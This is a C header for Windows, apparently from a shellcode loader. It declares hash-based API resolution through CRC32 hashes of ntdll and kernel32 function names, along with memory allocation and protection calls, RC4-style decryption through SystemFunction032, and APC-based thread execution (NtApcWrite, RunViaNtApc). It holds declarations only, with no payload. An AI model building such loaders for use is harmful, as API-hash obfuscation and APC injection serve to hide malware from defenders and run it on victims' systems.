#include <Windows.h>


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define SLEEP	5000

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define DEREF( name )		*(	UINT_PTR	*)	(name)
#define DEREF_64( name )	*(	DWORD64		*)	(name)
#define DEREF_32( name )	*(	DWORD		*)	(name)
#define DEREF_16( name )	*(	WORD		*)	(name)
#define DEREF_8( name )		*(	BYTE		*)	(name)


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#define SEED        0xED788320			// _CRC32b 

typedef unsigned char      uint8_t;
typedef unsigned short     uint16_t;
typedef unsigned int       uint32_t;
typedef unsigned long long uint64_t;



PVOID		_memcpy(PVOID Destination, PVOID Source, SIZE_T Size);
VOID		_ZeroMemory(PVOID Destination, SIZE_T Size);
CHAR		_ToUpper(CHAR C);
UINT32		_CopyDotStr(PCHAR String);
SIZE_T		_CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);
SIZE_T		_StrlenA(LPCSTR String);
SIZE_T		_StrlenW(LPCWSTR String);
uint32_t	_CRC32b(uint8_t* str);


#define HASH(API)	(_CRC32b((uint8_t*)API))

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

HMODULE GetModuleHandleH(DWORD dwModuleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
HMODULE LoadLibraryH(LPSTR DllName);


#define KERNEL32A_CRC32b				0x4151F19C
#define NTDLLA_CRC32b					0x92EF84B5
#define LdrLoadDllA_CRC32b				0xD98C33F3
#define RtlFillMemoryA_CRC32b			0xF85FF54A

#define SystemFunction032_CRC32b        0x84CDA95F
#define NtAllocateVirtualMemory_CRC32b  0xED4CE387
#define NtProtectVirtualMemory_CRC32b   0x801B405B
#define NtCreateThreadEx_CRC32b         0x0B2BA80F
#define NtQueueApcThread_CRC32b         0x7D313971
#define NtWaitForSingleObject_CRC32b    0xDD917B6F


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------


BOOL Initialize();
BOOL NtApcWrite(IN PBYTE pBuff, IN SIZE_T sLen, OUT LPVOID* ppAddress);
BOOL RunViaNtApc(IN LPVOID pAddress);


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------



